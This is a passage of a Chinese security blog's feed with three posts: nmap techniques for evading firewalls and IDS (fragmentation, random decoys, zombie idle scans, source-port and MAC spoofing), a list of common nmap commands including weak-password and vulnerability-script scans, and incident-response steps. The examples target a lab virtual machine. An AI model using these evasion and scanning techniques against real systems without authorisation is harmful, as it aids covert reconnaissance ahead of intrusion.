192.168.56.9</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.56.9 are filtered</span><br><span class="line">MAC Address: 08:00:27:19:2D:22 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.72 seconds</span><br></pre></td></tr></table></figure><blockquote><p>上述输出结果可以看到，可以探测主机存活，但探测不到服务</p></blockquote><h2 id="MTU"><a href="#MTU" class="headerlink" title="MTU"></a>MTU</h2><blockquote><p>修改默认的MTU的大小，MTU的大小必须为（8, 16, 24, 32, 等）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap –mtu 24</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo nmap -mtu 24 -sS -sV -O 192.168.56.9</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:49 CST</span><br><span class="line">Nmap scan report for 192.168.56.9</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.56.9 are filtered</span><br><span class="line">MAC Address: 08:00:27:19:2D:22 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Too many fingerprints match this host to give specific OS details</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.39 seconds</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">探测不了服务和版本</span></span><br></pre></td></tr></table></figure><h2 id="产生随机欺骗字符"><a href="#产生随机欺骗字符" class="headerlink" title="产生随机欺骗字符"></a>产生随机欺骗字符</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -D RND:10 [target]</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo nmap -D RND:10 -sS -sV -O 192.168.56.9</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:50 CST</span><br><span class="line">Nmap scan report for 192.168.56.9</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.56.9 are filtered</span><br><span class="line">MAC Address: 08:00:27:19:2D:22 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Too many fingerprints match this host to give specific OS details</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.48 seconds</span><br></pre></td></tr></table></figure><h2 id="手动指定ip地址伪造请求"><a href="#手动指定ip地址伪造请求" class="headerlink" title="手动指定ip地址伪造请求"></a>手动指定ip地址伪造请求</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -D decoy1,decoy2,decoy3 etc.</span></span><br></pre></td></tr></table></figure><h2 id="僵尸网络扫描，首先需要找到僵尸网络IP"><a href="#僵尸网络扫描，首先需要找到僵尸网络IP" class="headerlink" title="僵尸网络扫描，首先需要找到僵尸网络IP"></a>僵尸网络扫描，首先需要找到僵尸网络IP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sI [Zombie IP] [Target IP]</span></span><br></pre></td></tr></table></figure><h2 id="指定源端"><a href="#指定源端" class="headerlink" title="指定源端"></a>指定源端</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --source-port 80 IP</span><br></pre></td></tr></table></figure><h2 id="扫描完成后，添加随机数据"><a href="#扫描完成后，添加随机数据" class="headerlink" title="扫描完成后，添加随机数据"></a>扫描完成后，添加随机数据</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap --data-length 25 IP</span></span><br></pre></td></tr></table></figure><h2 id="MAC地址欺骗，可以生成不同的主机MAC地址"><a href="#MAC地址欺骗，可以生成不同的主机MAC地址" class="headerlink" title="MAC地址欺骗，可以生成不同的主机MAC地址"></a>MAC地址欺骗，可以生成不同的主机MAC地址</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap --spoof-mac Dell/Apple/3Com IP</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/1491826495144.jpg&quot; alt=&quot;enter description here&quot; title=&quot;1491826495144&quot;&gt;&lt;/p&gt;
&lt;p&gt;之前有一篇，&lt;a href=&quot;http://airs-sec.com/2017/04/01/nmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/&quot;&gt;nmap基本使用总结&lt;/a&gt;，都是一些基础的命令。&lt;/p&gt;
&lt;p&gt;namp作为一款神器，如何使用好nmap很重要，特别是对于前期信息手机阶段。见过很多人，在信息收集阶段讨厌使用namp，而选择其他的扫描工具，但我觉得，工欲善其事，必先利其器，任何工具，只要熟悉和去摸索，都能很好的去使用。&lt;/p&gt;
&lt;p&gt;通过nmap的最佳扫描策略，我们可以更搞笑的去使用nmap进行信息收集。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="nmap" scheme="http://airs-sec.com/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>nmap基本使用总结</title>
    <link href="http://airs-sec.com/2017/04/01/nmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://airs-sec.com/2017/04/01/nmap基本使用总结/</id>
    <published>2017-04-01T11:00:54.000Z</published>
    <updated>2017-04-02T15:13:22.704Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/Nmap-Intro-03262014.jpg" alt="enter description here" title="Nmap-Intro-03262014"></p><p>总结了一些nmap常用命令</p><a id="more"></a><h1 id="基本的扫描功能"><a href="#基本的扫描功能" class="headerlink" title="基本的扫描功能"></a>基本的扫描功能</h1><h2 id="1-1-扫描存活的主机，ping扫描"><a href="#1-1-扫描存活的主机，ping扫描" class="headerlink" title="1.1 扫描存活的主机，ping扫描"></a>1.1 扫描存活的主机，ping扫描</h2><p>nmap -sP 192.168.56.102</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491044888625.jpg" alt="enter description here" title="1"></p><h2 id="1-2-从文本中读取ip地址，并扫描端口和指定服务"><a href="#1-2-从文本中读取ip地址，并扫描端口和指定服务" class="headerlink" title="1.2 从文本中读取ip地址，并扫描端口和指定服务"></a>1.2 从文本中读取ip地址，并扫描端口和指定服务</h2><p>nmap -p80,22,23 -sV -iL testip.txt </p><p><img src="http://obgutsg63.bkt.clouddn.com/1491044922193.jpg" alt="enter description here" title="2"></p><p>1.3 只扫描开放的端口</p><p>nmap -p80,8080,22 –open 192.168.56.102</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045276175.jpg" alt="enter description here" title="3"></p><p>1.4 不使用反向解析(-n),扫描80端口开放的主机，同时保存为xml文件</p><p> nmap -n -p80 -iL testip.txt -sV -oX testip.xml</p><p> <img src="http://obgutsg63.bkt.clouddn.com/1491045324228.jpg" alt="enter description here" title="4"></p><p> 1.5 扫描一台主机的操作系统</p><p>sudo nmap -O 192.168.56.102</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045430130.jpg" alt="enter description here" title="5"></p><p>1.6 不检测存活主机，进行全端口扫描</p><p>nmap -Pn -A -p1-65535 -sV 192.168.56.102</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045456233.jpg" alt="enter description here" title="6"></p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045465057.jpg" alt="enter description here" title="7"></p><p>1.7扫描mysql的弱口令</p><p>nmap -p3306 –script=mysql-empty-password.nse 192.168.56.102</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045495691.jpg" alt="enter description here" title="8"></p><p>1.8 无ping扫描，不ping<br>p0</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045523434.jpg" alt="enter description here" title="9"></p><p>1.9 PS/PU/PA,SYN/UDP/ACK ping扫描</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045546807.jpg" alt="enter description here" title="10"></p><p>1.10 跟踪路由并扫描</p><p>sudo nmap -v –traceroute 192.168.56.102</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045582167.jpg" alt="enter description here" title="11"></p><p>1.11 sS/sT/sU,syn,tcp,udp连接扫描</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045599560.jpg" alt="enter description here" title="12"></p><p>1.12隐蔽扫描</p><p>sN/sF/sX,NULL/FIN/Xmas扫描</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045620022.jpg" alt="enter description here" title="13"></p><p>1.13操作系统版本探测</p><p>nmap -sV 192.168.56.102</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491045641787.jpg" alt="enter description here" title="14"></p><p>1.14 绕过防火墙和ids的检测</p><p>-f:绕防火墙</p><p>-D:指定多个ip地址,或者使用RND随机生成几个地址,在指定的诱饵之间使用逗号进行分割</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491046024060.jpg" alt="enter description here" title="15"></p><p>1.15 smb-check-vulns.nse 系统漏洞扫描</p><p>1.16 nmap保存与输出</p><p>标准格式保存<br>nmap -oN -sS test.txt 192.168.56.102</p><p>以xml的格式进行保存<br>nmap -oX sS test.xml 192.168.56.102</p><h1 id="Nmap-Full-Web-Vulnerable-Scan"><a href="#Nmap-Full-Web-Vulnerable-Scan" class="headerlink" title="Nmap Full Web Vulnerable Scan"></a><strong>Nmap Full Web Vulnerable Scan</strong></h1><p>利用脚本进行扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz</span><br><span class="line"></span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse target</span><br><span class="line"></span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target</span><br><span class="line"></span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target</span><br><span class="line"></span><br><span class="line">nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target</span><br><span class="line"></span><br><span class="line">nmap -sV --script=vuln target</span><br><span class="line"></span><br><span class="line">nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/Nmap-Intro-03262014.jpg&quot; alt=&quot;enter description here&quot; title=&quot;Nmap-Intro-03262014&quot;&gt;&lt;/p&gt;
&lt;p&gt;总结了一些nmap常用命令&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="nmap" scheme="http://airs-sec.com/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>应急响应总结</title>
    <link href="http://airs-sec.com/2017/03/02/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%BB%E7%BB%93/"/>
    <id>http://airs-sec.com/2017/03/02/应急响应总结/</id>
    <published>2017-03-02T12:59:33.000Z</published>
    <updated>2017-03-21T06:49:38.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h1><p>作为一个web测试人员，经常会遇到客户网站被黑的情况，客户叫我们去追查和解决问题的过程，通常叫做应急响应。</p><p>如果在政府单位，可能这种情况的确是比较紧急的。</p><p>如果遇到应急响应，我们该怎么做呢？</p><a id="more"></a><hr><h2 id="应急响应步骤"><a href="#应急响应步骤" class="headerlink" title="应急响应步骤"></a>应急响应步骤</h2><p>1.接到客户电话或者老板告诉你，得知，网站被攻击，网站存在异常，网站打不开。 </p><p>2.在得知了安全事件发生之后，该如何处理呢？ </p><p>A.第一时间就是如何保障客户的系统能尽快的恢复，而不会影响客户的业务，跟客户沟通最有效的解决方式。 </p><p>这种解决方式有暂时性和永久性，暂时性指的是先检测网站存在哪些异常，分析日志，病毒扫描，找出木马，清除木马，保障客户的系统不会再一次出现打不开的情况。永久性指的就是重做系统，重新部署业务。 </p><p>考虑客户的情况，选择不同的方式。但无论哪种方式，能尽快解决客户的当前问题才是最重要的，毕竟分析攻击来源，不是一时半会就能分析出来的。 </p><p>B.安全加固方面 </p><p>利用客户现有的网络拓扑，把相应的安全设备利用起来，做好相应的安全策略，尽量不把服务器直接暴露在公网。而是通过防火墙进行映射，服务器配置内网地址。关闭服务器上不需要的端口，如3389，如果要开远程的话，就通过连接到客户的内网pc，通过pc连接到服务器，这样是比较安全的或者直接在防火墙上开启vpn。 </p><p><strong>在服务器前放置WAF进行防护，针对各种攻击进行拦截。</strong> </p><p>C.业务恢复后，网络加固了之后，对应用在进行进一步的测试，对安全设备的瓶颈进行预估，而不会说由于安全设备的防护不足，导致服务器存在攻击的危险。 </p><p>D.所有的东西都完成之后，最后，如果在可能的情况下，对以前受攻击的环境进行模拟，从而分析出这次攻击的主要原因，攻击者如何连接到服务器的，分析受到攻击的原因，并形成相应的报告。 </p><p>应急响应流程</p><p>应急响应精妙总结</p><p><strong>来源:piaca</strong> </p><p><strong>被“黑了”</strong> </p><p>被入侵 被蠕虫 被钓鱼 被DDOS 被劫持 </p><p><strong>为什么做应急响应</strong> </p><p>保障业务 还原攻击 明确意图 解决方案 查漏补缺 司法途径 </p><p><strong>怎么做应急响应</strong> </p><p>确定攻击时间 查找攻击线索 梳理攻击流程 实施解决方案 定位攻击人、取证 </p><p><strong>为什么反渗透</strong> </p><p>被动变主动 攻击者都在做什么 确认攻击者是谁 取证 </p><p><strong>总结：</strong></p><p>业务角度 保障业务优先 对抗角度 了解对手 技术角度 攻击技术 日志、流量等数据 </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;经验&quot;&gt;&lt;a href=&quot;#经验&quot; class=&quot;headerlink&quot; title=&quot;经验&quot;&gt;&lt;/a&gt;经验&lt;/h1&gt;&lt;p&gt;作为一个web测试人员，经常会遇到客户网站被黑的情况，客户叫我们去追查和解决问题的过程，通常叫做应急响应。&lt;/p&gt;
&lt;p&gt;如果在政府单位，可能这种情况的确是比较紧急的。&lt;/p&gt;
&lt;p&gt;如果遇到应急响应，我们该怎么做呢？&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
</feed>
